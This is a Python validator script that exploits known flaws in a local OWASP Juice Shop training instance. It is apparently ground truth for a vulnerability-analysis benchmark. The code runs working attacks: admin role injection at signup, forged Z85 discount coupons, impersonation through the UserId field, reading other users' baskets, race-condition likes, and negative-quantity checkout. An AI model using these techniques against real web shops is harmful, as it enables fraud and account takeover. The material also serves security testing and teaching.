#!/usr/bin/env python3
"""
OWASP Juice Shop (localhost:3000) vulnerability validator.

Tests JS-01..JS-11 (official OWASP scoreboard challenges, in analysis scope)
and JS-12..JS-15 (former v3 entries, removed 2026-05-19 because they are not
in the official scoreboard — bugs are real, retained here for audit).
Reports PASS / FAIL per ground-truth scoring signature, split into the two
groups.

Run: python3 verify_js.py
"""

import base64
import json
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from typing import Any, Dict, Optional, Tuple

BASE = "http://localhost:3000"
TS = int(time.time())
RESULTS = []


def http(method: str, path: str, token: Optional[str] = None,
         body: Optional[Any] = None, raw: bool = False) -> Tuple[int, Any]:
    url = BASE + path
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
        headers["Cookie"] = f"token={token}"
    data = None
    if body is not None:
        if isinstance(body, (dict, list)):
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"
        else:
            data = body if isinstance(body, bytes) else str(body).encode()
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            txt = resp.read().decode("utf-8", "replace")
            if raw:
                return resp.status, txt
            try:
                return resp.status, json.loads(txt) if txt else {}
            except json.JSONDecodeError:
                return resp.status, {"_raw": txt[:300]}
    except urllib.error.HTTPError as e:
        txt = e.read().decode("utf-8", "replace")
        if raw:
            return e.code, txt
        try:
            return e.code, json.loads(txt) if txt else {}
        except json.JSONDecodeError:
            return e.code, {"_raw": txt[:300]}
    except Exception as e:
        return 0, {"_error": str(e)}


def get(p, token=None, raw=False): return http("GET", p, token, raw=raw)
def post(p, body=None, token=None):   return http("POST", p, token, body)
def put(p, body=None, token=None):    return http("PUT", p, token, body)
def delete_(p, token=None):        return http("DELETE", p, token)


def fresh_email(tag): return f"js_{tag}_{TS}_{uuid.uuid4().hex[:6]}@test.com"


def register(tag: str, role: Optional[str] = None,
             password_repeat_mismatch: bool = False) -> Tuple[int, Dict[str, Any], str, str]:
    email = fresh_email(tag)
    pwd = "Test123!"
    body = {
        "email": email,
        "password": pwd,
        "passwordRepeat": "DIFFERENT" if password_repeat_mismatch else pwd,
        "securityQuestion": {"id": 2},
        "securityAnswer": "test",
    }
    if role:
        body["role"] = role
    code, j = post("/api/Users", body)
    return code, j, email, pwd


def login(email: str, password: str = "Test123!") -> Tuple[str, int]:
    """Return (jwt, user_id)."""
    code, j = post("/rest/user/login", {"email": email, "password": password})
    if code != 200 or "authentication" not in j:
        raise RuntimeError(f"login failed: {code} {j}")
    token = j["authentication"]["token"]
    user_id = _decode_jwt(token)["data"]["id"]
    return token, user_id


def _decode_jwt(token: str) -> Dict[str, Any]:
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))


def find_basket_id(token: str, user_id: int, start: int = 1, stop: int = 200) -> Optional[int]:
    for bid in range(start, stop + 1):
        code, j = get(f"/rest/basket/{bid}", token)
        if code != 200 or not isinstance(j, dict):
            continue
        data = j.get("data")
        if data and data.get("UserId") == user_id:
            return bid
    return None


def fetch_captcha(token: str) -> Dict[str, Any]:
    _, j = get("/rest/captcha/", token)
    return j


def record(vid, ok, note=""):
    status = "PASS" if ok else "FAIL"
    RESULTS.append((vid, status, note))
    sym = "\033[92m✓\033[0m" if ok else "\033[91m✗\033[0m"
    print(f"  {sym} {vid:5s} {status}: {note}")


# ---------------------------------------------------------------------------
# Setup standard fresh user (return token, user_id, basket_id)
# ---------------------------------------------------------------------------

def standard_user(tag: str) -> Tuple[str, int, int]:
    code, j, email, pwd = register(tag)
    if code != 201:
        raise RuntimeError(f"register: {code} {j}")
    token, user_id = login(email, pwd)
    bid = find_basket_id(token, user_id)
    if bid is None:
        raise RuntimeError(f"basket not found for user {user_id}")
    return token, user_id, bid


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

def test_js01():
    """Delete feedback as non-admin user."""
    print("\n[JS-01] Five-Star Feedback (delete-as-customer)")
    try:
        token, _uid, _bid = standard_user("js01")
        # List feedbacks
        _, j = get("/api/Feedbacks", token)
        feedbacks = j.get("data", [])
        if not feedbacks:
            record("JS-01", False, "no feedbacks present to delete")
            return
        target_id = feedbacks[0]["id"]
        code, j = delete_(f"/api/Feedbacks/{target_id}", token)
        ok = code == 200 and j.get("status") == "success"
        record("JS-01", ok, f"deleted feedback id={target_id} HTTP {code}")
    except Exception as e:
        record("JS-01", False, f"error: {e}")


def test_js02():
    """Forged coupon: z85('MAY26-80') applied via PUT /rest/basket/<id>/coupon/<coupon>."""
    print("\n[JS-02] Forged Coupon")
    try:
        token, _uid, bid = standard_user("js02")
        # Encode current month: server uses Date.toLocaleString → JS encodes "MMMyy-DD"
        # Per ground truth: MAY26 = May 2026. Use today.
        import datetime
        now = datetime.datetime.utcnow()
        month3 = now.strftime("%b").upper()  # 'MAY'
        yy = now.strftime("%y")  # '26'
        plaintext = f"{month3}{yy}-80"
        # z85 encoding (RFC 32/Z85). 4 input bytes → 5 output chars. Input must be length%4==0.
        Z85_CHARS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
        pt_bytes = plaintext.encode()
        # Pad to multiple of 4
        pad = (-len(pt_bytes)) % 4
        pt_bytes_padded = pt_bytes + b"\x00" * pad
        out = []
        for i in range(0, len(pt_bytes_padded), 4):
            v = int.from_bytes(pt_bytes_padded[i:i+4], "big")
            chunk = []
            for _ in range(5):
                chunk.append(Z85_CHARS[v % 85])
                v //= 85
            out.append("".join(reversed(chunk)))
        coupon = "".join(out)
        # Apply
        coupon_url = urllib.parse.quote(coupon, safe="")
        code, raw = get(f"/rest/basket/{bid}/coupon/{coupon_url}", token, raw=True)
        # Endpoint accepts via PUT
        code, raw = http("PUT", f"/rest/basket/{bid}/coupon/{coupon_url}", token, raw=True)
        # Response: {"discount":80}
        try:
            j = json.loads(raw)
            disc = j.get("discount", 0)
        except Exception:
            disc = 0
        ok = code == 200 and disc >= 50
        record("JS-02", ok, f"plain={plaintext} z85={coupon} discount={disc} HTTP {code}")
    except Exception as e:
        record("JS-02", False, f"error: {e}")


def test_js03():
    """Forged feedback: submit with UserId != our id."""
    print("\n[JS-03] Forged Feedback (impersonate via UserId)")
    try:
        token, uid, _bid = standard_user("js03")
        cap = fetch_captcha(token)
        target_uid = 1 if uid != 1 else 2
        code, j = post("/api/Feedbacks", {
            "UserId": target_uid, "comment": "forged", "rating": 5,
            "captchaId": cap["captchaId"], "captcha": cap["answer"],
        }, token=token)
        # Bug: returned data UserId == target_uid (not ours)
        returned_uid = (j.get("data") or {}).get("UserId")
        ok = code == 201 and returned_uid == target_uid and returned_uid != uid
        record("JS-03", ok, f"our_uid={uid} requested={target_uid} stored={returned_uid} HTTP {code}")
    except Exception as e:
        record("JS-03", False, f"error: {e}")


def test_js04():
    """Forged review: PUT /rest/products/:id/reviews with arbitrary author."""
    print("\n[JS-04] Forged Review")
    try:
        token, _uid, _bid = standard_user("js04")
        target_author = "admin@juice-sh.op"
        code, j = put("/rest/products/1/reviews", {
            "message": f"forged-{TS}", "author": target_author,
        }, token=token)
        # Read back: search reviews for product 1
        code2, j2 = get("/rest/products/1/reviews", token)
        reviews = j2.get("data", [])
        match = next((r for r in reviews if r.get("message") == f"forged-{TS}"), None)
        ok = code in (200, 201) and match and match.get("author") == target_author
        record("JS-04", ok, f"author_stored={match.get('author') if match else '-'} HTTP {code}")
    except Exception as e:
        record("JS-04", False, f"error: {e}")


def test_js05():
    """Manipulate basket: view a basket not owned by us."""
    print("\n[JS-05] Manipulate Basket (view other user's basket)")
    try:
        token, uid, bid = standard_user("js05")
        # View basket 1 (admin)
        target_bid = 1
        code, j = get(f"/rest/basket/{target_bid}", token)
        data = j.get("data") or {}
        stored_uid = data.get("UserId")
        ok = code == 200 and stored_uid is not None and stored_uid != uid
        record("JS-05", ok, f"my_uid={uid}/bid={bid} viewed_bid={target_bid} owner={stored_uid} HTTP {code}")
    except Exception as e:
        record("JS-05", False, f"error: {e}")


def test_js06():
    """Multiple Likes: race condition on liking a review."""
    print("\n[JS-06] Multiple Likes (race)")
    try:
        token, _uid, _bid = standard_user("js06")
        # Get a review to like
        _, j = get("/rest/products/1/reviews", token)
        reviews = j.get("data", [])
        if not reviews:
            record("JS-06", False, "no reviews on product 1")
            return
        review_id = reviews[0]["_id"]
        # 5 parallel likes
        results = []
        def liker():
            c, _ = post("/rest/products/reviews", {"id": review_id}, token=token)
            results.append(c)
        threads = [threading.Thread(target=liker) for _ in range(5)]
        for t in threads: t.start()
        for t in threads: t.join()
        # Re-read review
        _, j = get("/rest/products/1/reviews", token)
        reviews = j.get("data", [])
        r = next((x for x in reviews if x.get("_id") == review_id), {})
        liked = r.get("likedBy", []) or []
        # Count my email occurrences (we registered, our email is unique)
        my_email = _decode_jwt(token)["data"]["email"]
        my_count = sum(1 for e in liked if e == my_email)
        ok = my_count >= 2
        record("JS-06", ok, f"my_email_count={my_count} (≥2 means race won) liked_total={len(liked)}")
    except Exception as e:
        record("JS-06", False, f"error: {e}")


def test_js07():
    """Payback Time: negative quantity accepted; checkout succeeds."""
    print("\n[JS-07] Payback Time (negative quantity)")
    try:
        token, _uid, bid = standard_user("js07")
        code, j = post("/api/BasketItems", {
            "ProductId": 6, "BasketId": bid, "quantity": -1000,
        }, token=token)
        q_stored = ((j.get("data") or {}).get("quantity"))
        # Checkout
        code2, j2 = post(f"/rest/basket/{bid}/checkout", {}, token=token)
        conf = (j2.get("orderConfirmation") if isinstance(j2, dict) else None)
        ok = code == 200 and q_stored == -1000 and code2 == 200 and conf
        record("JS-07", ok, f"stored_q={q_stored} order={conf} HTTP item={code} checkout={code2}")
    except Exception as e:
        record("JS-07", False, f"error: {e}")


def test_js08():
    """Confidential Document at /ftp/acquisitions.md (no auth)."""
    print("\n[JS-08] Confidential Document")
    try:
        code, raw = get("/ftp/acquisitions.md", raw=True)
        ok = code == 200 and "confidential" in raw.lower()
        record("JS-08", ok, f"HTTP {code} contains_confidential={'confidential' in raw.lower()}")
    except Exception as e:
        record("JS-08", False, f"error: {e}")


def test_js09():
    """Empty/mismatched passwordRepeat accepted at registration."""
    print("\n[JS-09] Empty User Registration (passwordRepeat ignored)")
    try:
        code, j, email, _pwd = register("js09", password_repeat_mismatch=True)
        ok = code == 201 and (j.get("data") or {}).get("email") == email
        record("JS-09", ok, f"created={email if ok else '-'} HTTP {code}")
    except Exception as e:
        record("JS-09", False, f"error: {e}")


def test_js10():
    """Same as JS-09 (mass registration, mismatched passwords). Distinct via repetition."""
    print("\n[JS-10] Repetitive Registration")
    try:
        # Two consecutive registrations with mismatched passwordRepeat
        c1, j1, e1, _ = register("js10a", password_repeat_mismatch=True)
        c2, j2, e2, _ = register("js10b", password_repeat_mismatch=True)
        ok = c1 == 201 and c2 == 201 and e1 != e2
        record("JS-10", ok, f"two_signups e1={e1[:25]} e2={e2[:25]} HTTP {c1},{c2}")
    except Exception as e:
        record("JS-10", False, f"error: {e}")


def test_js11():
    """Admin role injection at registration."""
    print("\n[JS-11] Admin Registration (role injection)")
    try:
        code, j, _email, _pwd = register("js11", role="admin")
        role = (j.get("data") or {}).get("role")
        ok = code == 201 and role == "admin"
        record("JS-11", ok, f"role={role} HTTP {code}")
    except Exception as e:
        record("JS-11", False, f"error: {e}")


def test_js12():
    """Checkout with empty body, skipping address/payment.
    REMOVED from analysis 2026-05-19 — real bug, not an official OWASP JS challenge."""
    print("\n[JS-12 REMOVED] Checkout Flow Skip")
    try:
        token, _uid, bid = standard_user("js12")
        # Add an item first
        post("/api/BasketItems", {"ProductId": 1, "BasketId": bid, "quantity": 1}, token=token)
        # Checkout empty body
        code, j = post(f"/rest/basket/{bid}/checkout", {}, token=token)
        conf = (j.get("orderConfirmation") if isinstance(j, dict) else None)
        ok = code == 200 and conf
        record("JS-12", ok, f"orderConfirmation={conf} HTTP {code}")
    except Exception as e:
        record("JS-12", False, f"error: {e}")


def test_js13():
    """Captcha replay: same captchaId used twice.
    REMOVED 2026-05-19 — only #14 CAPTCHA Bypass exists (different mechanism: 10/20s flood)."""
    print("\n[JS-13 REMOVED] Captcha Replay")
    try:
        token, uid, _bid = standard_user("js13")
        cap = fetch_captcha(token)
        c1, j1 = post("/api/Feedbacks", {
            "UserId": uid, "comment": f"first-{TS}", "rating": 5,
            "captchaId": cap["captchaId"], "captcha": cap["answer"],
        }, token=token)
        c2, j2 = post("/api/Feedbacks", {
            "UserId": uid, "comment": f"replay-{TS}", "rating": 1,
            "captchaId": cap["captchaId"], "captcha": cap["answer"],
        }, token=token)
        ok = c1 == 201 and c2 == 201
        record("JS-13", ok, f"first HTTP {c1} replay HTTP {c2}")
    except Exception as e:
        record("JS-13", False, f"error: {e}")


def test_js14():
    """Checkout replay: same basket, two orderConfirmation IDs.
    REMOVED 2026-05-19 — real bug, not an official OWASP JS challenge."""
    print("\n[JS-14 REMOVED] Basket Checkout Replay")
    try:
        token, _uid, bid = standard_user("js14")
        post("/api/BasketItems", {"ProductId": 1, "BasketId": bid, "quantity": 1}, token=token)
        c1, j1 = post(f"/rest/basket/{bid}/checkout", {}, token=token)
        c2, j2 = post(f"/rest/basket/{bid}/checkout", {}, token=token)
        conf1 = j1.get("orderConfirmation") if isinstance(j1, dict) else None
        conf2 = j2.get("orderConfirmation") if isinstance(j2, dict) else None
        ok = c1 == 200 and c2 == 200 and conf1 and conf2 and conf1 != conf2
        record("JS-14", ok, f"conf1={conf1} conf2={conf2} HTTP {c1},{c2}")
    except Exception as e:
        record("JS-14", False, f"error: {e}")


def test_js15():
    """Coupon reuse: same code applied twice.
    REMOVED 2026-05-19 — official coupon challenges are #28 Expired (manipulateClock) and #31 Forged (≥80% discount, mapped to JS-02)."""
    print("\n[JS-15 REMOVED] Coupon Reuse")
    try:
        token, _uid, bid = standard_user("js15")
        # Use a valid coupon: forge MMMYY-50 like JS-02
        import datetime
        now = datetime.datetime.utcnow()
        plaintext = f"{now.strftime('%b').upper()}{now.strftime('%y')}-50"
        Z85_CHARS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
        pb = plaintext.encode()
        pb += b"\x00" * ((-len(pb)) % 4)
        out = []
        for i in range(0, len(pb), 4):
            v = int.from_bytes(pb[i:i+4], "big"); chunk = []
            for _ in range(5):
                chunk.append(Z85_CHARS[v % 85]); v //= 85
            out.append("".join(reversed(chunk)))
        coupon = urllib.parse.quote("".join(out), safe="")
        c1, raw1 = http("PUT", f"/rest/basket/{bid}/coupon/{coupon}", token, raw=True)
        c2, raw2 = http("PUT", f"/rest/basket/{bid}/coupon/{coupon}", token, raw=True)
        d1 = json.loads(raw1).get("discount") if c1 == 200 else None
        d2 = json.loads(raw2).get("discount") if c2 == 200 else None
        ok = c1 == 200 and c2 == 200 and d1 and d2
        record("JS-15", ok, f"d1={d1} d2={d2} HTTP {c1},{c2}")
    except Exception as e:
        record("JS-15", False, f"error: {e}")


# ---------------------------------------------------------------------------

def main():
    print(f"=== Juice Shop Validator ({BASE}) ===")
    code, _ = get("/rest/admin/application-version")
    if code != 200:
        print(f"FATAL: server not reachable (HTTP {code})", file=sys.stderr); sys.exit(1)
    print("Server reachable.")
    official_tests = [test_js01, test_js02, test_js03, test_js04, test_js05, test_js06,
                      test_js07, test_js08, test_js09, test_js10, test_js11]
    removed_tests = [test_js12, test_js13, test_js14, test_js15]
    for t in official_tests + removed_tests:
        try: t()
        except Exception as e: print(f"  [unhandled] {t.__name__}: {e}")
    print("\n" + "=" * 60)
    official_ids = {f"JS-{i:02d}" for i in range(1, 12)}
    removed_ids  = {f"JS-{i:02d}" for i in range(12, 16)}
    off_pass = sum(1 for v, s, _ in RESULTS if v in official_ids and s == "PASS")
    off_fail = sum(1 for v, s, _ in RESULTS if v in official_ids and s == "FAIL")
    rem_pass = sum(1 for v, s, _ in RESULTS if v in removed_ids  and s == "PASS")
    rem_fail = sum(1 for v, s, _ in RESULTS if v in removed_ids  and s == "FAIL")
    print(f"Juice Shop summary:")
    print(f"  Official (in analysis scope, JS-01..JS-11): {off_pass} PASS / {off_fail} FAIL")
    print(f"  Removed (audit-only, JS-12..JS-15):         {rem_pass} PASS / {rem_fail} FAIL")
    failed = off_fail + rem_fail
    if failed:
        print("\nFailed:")
        for vid, status, note in RESULTS:
            if status == "FAIL":
                print(f"  {vid}: {note}")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
